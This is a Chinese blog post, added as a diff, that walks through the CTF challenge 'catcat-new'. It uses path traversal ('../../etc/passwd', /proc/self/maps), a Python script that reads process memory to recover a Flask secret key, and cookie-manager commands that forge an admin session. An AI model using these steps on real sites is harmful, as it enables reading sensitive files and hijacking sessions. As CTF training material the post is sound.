@@ -1,0 +1,736 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    [CATCTF]catcat-new |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="知识点12345678910111213141516171819Linux系统敏感文件，flask_session_cookie_manager伪造session并执行，session存储在cookie中&#x2F;etc&#x2F;passwd该文件储存了该Linux系统中所有用户的一些基本信息，只有root权限才可以修改。其具体格式为      用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shel">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[CATCTF]catcat-new">
+<meta property="og:url" content="http://example.com/2025/04/04/[CATCTF]catcat-new/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="知识点12345678910111213141516171819Linux系统敏感文件，flask_session_cookie_manager伪造session并执行，session存储在cookie中&#x2F;etc&#x2F;passwd该文件储存了该Linux系统中所有用户的一些基本信息，只有root权限才可以修改。其具体格式为      用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shel">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/20250404162957814.png">
+<meta property="og:image" content="http://example.com/images/20250404163134049.png">
+<meta property="og:image" content="http://example.com/images/20250404163407456.png">
+<meta property="og:image" content="http://example.com/images/20250404164207032.png">
+<meta property="og:image" content="http://example.com/images/20250404164628617.png">
+<meta property="og:image" content="http://example.com/images/20250404170458785.png">
+<meta property="og:image" content="http://example.com/images/20250404172009978.png">
+<meta property="og:image" content="http://example.com/images/20250404172520361.png">
+<meta property="article:published_time" content="2025-04-04T08:27:08.000Z">
+<meta property="article:modified_time" content="2025-04-04T09:40:08.132Z">
+<meta property="article:author" content="fuboy">
+<meta property="article:tag" content="Linux特殊文件">
+<meta property="article:tag" content="Python-Flask框架审计">
+<meta property="article:tag" content="session伪造">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/20250404162957814.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="[CATCTF]catcat-new">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">[CATCTF]catcat-new</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
+  <div class="sidebar-author-name">fuboy</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">89</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">66</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-[CATCTF]catcat-new" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/04/04/%5BCATCTF%5Dcatcat-new/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-04-04T08:27:08.000Z" itemprop="datePublished">2025-04-04</time>
+    <time style="display: none;" id="post-update-time">2025-04-04</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98/" data-aos="zoom-in">刷题</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Linux系统敏感文件，flask_session_cookie_manager伪造session并执行，session存储在cookie中</span><br><span class="line"></span><br><span class="line">/etc/passwd</span><br><span class="line">该文件储存了该Linux系统中所有用户的一些基本信息，只有root权限才可以修改。其具体格式为      用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell（以冒号作为分隔符）</span><br><span class="line"></span><br><span class="line">/proc/self</span><br><span class="line">proc是一个伪文件系统，它提供了内核数据结构的接口。内核数据是在程序运行时存储在内部半导体存储器中数据。通过/proc/PID可以访问对应PID的进程内核数据，而/proc/self访问的是当前进程的内核数据。</span><br><span class="line"></span><br><span class="line">/proc/self/cmdline</span><br><span class="line">该文件包含的内容为当前进程执行的命令行参数。</span><br><span class="line"></span><br><span class="line">/proc/self/mem</span><br><span class="line">/proc/self/mem是当前进程的内存内容，通过修改该文件相当于直接修改当前进程的内存数据。但是注意该文件不能直接读取，因为文件中存在着一些无法读取的未被映射区域。所以要结合/proc/self/maps中的偏移地址进行读取。通过参数start和end及偏移地址值读取内容。</span><br><span class="line"></span><br><span class="line">/proc/self/maps</span><br><span class="line">/proc/self/maps包含的内容是当前进程的内存映射关系，可通过读取该文件来得到内存数据映射的地址。</span><br><span class="line"></span><br><span class="line">flask-session结构</span><br><span class="line"> flask_session是flask框架实现session功能的一个插件。其session结构分为三部分：序列化内容+时间+防篡改值，这三部分内容加密后以符号 “.”来进行分隔。flask_session默认session的储存是在用户Cookie中。但也可以指定存储在数据库，缓存中间件，服务器本地文件等等之中。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/20250404162957814.png" alt="image-20250404162957814"></p>
+<p>进入题目首页</p>
+<p>都是一些小动物的封面</p>
+<p>每一个封面都能点击</p>
+<p><img src="/../images/20250404163134049.png" alt="image-20250404163134049"></p>
+<p>进去之后就是单个的信息</p>
+<p>但我们注意到这个页面的url</p>
+<p>?file&#x3D;…</p>
+<p>这可能是一个文件包含漏洞</p>
+<p>我们来尝试访问一下&#x2F;etc&#x2F;passwd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=../../etc/passwd</span><br><span class="line">因为不知道所处路径，只能目录遍历</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/20250404163407456.png" alt="image-20250404163407456"></p>
+<p>发现有回显</p>
+<p>但当我们直接访问&#x2F;flag是成功不了的(什么信息都没有，能成功才是出鬼了)</p>
+<p>那就需要用这个文件包含漏洞来进行信息收集了</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这里介绍一个工具</p>
+<p>wappalyzer</p>
+<p>可以用它来检查网站前端信息，比如所使用的框架</p>
+<p>这里看到本题使用的是flask框架</p>
+<p><img src="/../images/20250404164207032.png" alt="image-20250404164207032"></p>
+<p>接着我们访问<code>../../../../proc/self/cmdline</code></p>
+<p><img src="/../images/20250404164628617.png" alt="image-20250404164628617"></p>
+<p>发现有一个通过python启动app.py的命令</p>
+<p>那就能知道源码程序就是app.py了</p>
+<p>我们访问app.py文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import uuid</span><br><span class="line">from flask import Flask, request, session, render_template, Markup</span><br><span class="line">from cat import cat</span><br><span class="line"> </span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">app = Flask(</span><br><span class="line">    __name__,</span><br><span class="line">    static_url_path=&#x27;/&#x27;,</span><br><span class="line">    static_folder=&#x27;static&#x27;</span><br><span class="line">)</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(uuid.uuid4()).replace(&quot;-&quot;, &quot;&quot;) + &quot;*abcdefgh&quot;  # 此处利用uuid.uuid4()生成了一串id字符串并在后面拼接*abcdefgh</span><br><span class="line">if os.path.isfile(&quot;/flag&quot;):  # 导入flag文件并删除掉</span><br><span class="line">    flag = cat(&quot;/flag&quot;)</span><br><span class="line">    os.remove(&quot;/flag&quot;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    detailtxt = os.listdir(&#x27;./details/&#x27;)</span><br><span class="line">    cats_list = []</span><br><span class="line">    for i in detailtxt:</span><br><span class="line">        cats_list.append(i[:i.index(&#x27;.&#x27;)])</span><br><span class="line"> </span><br><span class="line">    return render_template(&quot;index.html&quot;, cats_list=cats_list, cat=cat)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">@app.route(&#x27;/info&#x27;, methods=[&quot;GET&quot;, &#x27;POST&#x27;])</span><br><span class="line">def info():</span><br><span class="line">    filename = &quot;./details/&quot; + request.args.get(&#x27;file&#x27;, &quot;&quot;)</span><br><span class="line">    start = request.args.get(&#x27;start&#x27;, &quot;0&quot;)</span><br><span class="line">    end = request.args.get(&#x27;end&#x27;, &quot;0&quot;)</span><br><span class="line">    name = request.args.get(&#x27;file&#x27;, &quot;&quot;)[:request.args.get(&#x27;file&#x27;, &quot;&quot;).index(&#x27;.&#x27;)]</span><br><span class="line"> </span><br><span class="line">    return render_template(&quot;detail.html&quot;, catname=name, info=cat(filename, start, end))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">@app.route(&#x27;/admin&#x27;, methods=[&quot;GET&quot;])  # 在session信息中admin=1的用户在/admin路径下访问网站可以获得flag，所以要伪造session。</span><br><span class="line">def admin_can_list_root():</span><br><span class="line">    if session.get(&#x27;admin&#x27;) == 1:</span><br><span class="line">        return flag</span><br><span class="line">    else:</span><br><span class="line">        session[&#x27;admin&#x27;] = 0</span><br><span class="line">    return &quot;NoNoNo&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, debug=False, port=5637)</span><br></pre></td></tr></table></figure>
+
+<p>需要代码审计</p>
+<p>主要看&#x2F;admin路由</p>
+<p>通过这段代码我们得知：session信息中 admin&#x3D;1 的用户可以访问 &#x2F;admin 拿到 flag，而 session 信息中 admin&#x3D;0 则会显示 NoNoNo。</p>
+<p>我们只需要伪造一个 data为 admin&#x3D;1 的ssession 即可。</p>
+<p>session 的伪造 需要 serect_key，serect_key的值可通过内存数据获取，在读取内存数据文件(proc&#x2F;self&#x2F;mem)之前，我们需要知道哪些内存是可以读写的，这就需要我们先通过proc&#x2F;self&#x2F;maps获取可读内容的映射地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当前进程的内存映射</span><br><span class="line">?file=../../proc/self/maps </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/20250404170458785.png" alt="image-20250404170458785"></p>
+<p><strong>接着编写脚本，访问可读写的内存区域并且寻找 serect_key：</strong></p>
+<p><strong>将 &#x2F;proc&#x2F;self&#x2F;maps 中内容存储在 test.txt 中，用来执行脚本：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">maps = open(&#x27;&quot;E:\\test.txt&quot;&#x27;)  # 打开名为 &#x27;test.txt&#x27; 的文件并赋值给变量 maps</span><br><span class="line">b = maps.read()  # 读取文件内容并赋值给变量 b</span><br><span class="line">lst = b.split(&#x27;\\n&#x27;)  # 根据换行符 &#x27;\n&#x27; 将文件内容拆分为列表，并赋值给变量 lst，映射表中的内容是一行一行的。</span><br><span class="line"> </span><br><span class="line">for line in lst:  # 遍历列表 lst 中的每一行内容</span><br><span class="line">    if &#x27;rw&#x27; in line:  # 如果当前行包含 &#x27;rw&#x27;，&#x27;rw&#x27; 代表该内存区域可读可写，&#x27;r&#x27;代表可读，&#x27;w&#x27;代表可写</span><br><span class="line">        addr = re.search(&#x27;([0-9a-f]+)-([0-9a-f]+)&#x27;, line)  # 使用正则表达式在当前行中搜索地址范围并保存到变量 addr 中</span><br><span class="line">        start = int(addr.group(1), 16)  # 将地址范围的起始地址从十六进制转换为十进制，并赋值给变量 start</span><br><span class="line">        end = int(addr.group(2), 16)  # 将地址范围的结束地址从十六进制转换为十进制，并赋值给变量 end</span><br><span class="line">        print(start, end)  # 打印起始地址和结束地址</span><br><span class="line"> </span><br><span class="line">        # 构造请求URL，用于读取 /proc/self/mem 文件的特定区域</span><br><span class="line">        url = f&quot;http://61.147.171.105:52968/info?file=../../../proc/self/mem&amp;start=&#123;start&#125;&amp;end=&#123;end&#125;&quot;</span><br><span class="line">        </span><br><span class="line">        # 发送 GET 请求并获取响应</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        </span><br><span class="line">        # 使用正则表达式从响应文本中找到符合指定格式的 SECRET_KEY</span><br><span class="line">        secret_key = re.findall(&quot;[a-z0-9]&#123;32&#125;\*abcdefgh&quot;, response.text)</span><br><span class="line">        </span><br><span class="line">        # 如果找到了 SECRET_KEY，则打印并结束循环</span><br><span class="line">        if secret_key:</span><br><span class="line">            print(secret_key)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>解出密钥为<code>[&#39;57f176ee47714116a8103771f103f06f*abcdefgh&#39;]</code></p>
+<p>我们还需要flask_session_cookie_manager工具来伪造session</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s “secret_key” -c “session” </span><br><span class="line">填入密钥和访问admin页面抓包得到的session</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/20250404172009978.png" alt="image-20250404172009978"></p>
+<p>session被解密出来了，admin&#x3D;0</p>
+<p>那根据题目所提示，我们需要admin&#x3D;1</p>
+<p>那我们执行命令来伪造新session</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;secret_key&quot; -t &quot;&#123;&#x27;admin&#x27;:1&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>（抓到的包不要丢，不然session又要抓一遍）或者放到重放器里</p>
+<p><img src="/../images/20250404172520361.png" alt="image-20250404172520361"></p>
+<p>得到了伪造的session，修改数据包里的session，放包即可得到flag</p>
+<p>注意最后修改的时候，如果动作太快会得不出flag。这是因为本地时间和服务器时间不一致，本地生成的session时间比较新，要过一段时间才能生效</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Linux%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6/" rel="tag">Linux特殊文件</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Python-Flask%E6%A1%86%E6%9E%B6%E5%AE%A1%E8%AE%A1/" rel="tag">Python-Flask框架审计</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/session%E4%BC%AA%E9%80%A0/" rel="tag">session伪造</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="[SWPUCTF 2018]SimplePHP" class="lazyload">
+        
+        <a href="/2025/04/05/%5BSWPUCTF%202018%5DSimplePHP/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            [SWPUCTF 2018]SimplePHP
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="../images/1737907114de8a.jpg" data-sizes="auto" alt="[HFCTF2020]EasyLogin" class="lazyload">
+        
+      
+      <a href="/2025/04/04/%5BHFCTF2020%5DEasyLogin/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          [HFCTF2020]EasyLogin
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      fuboy
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        120.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        08:20
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
+  <div class="sidebar-author-name">fuboy</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">89</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">66</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
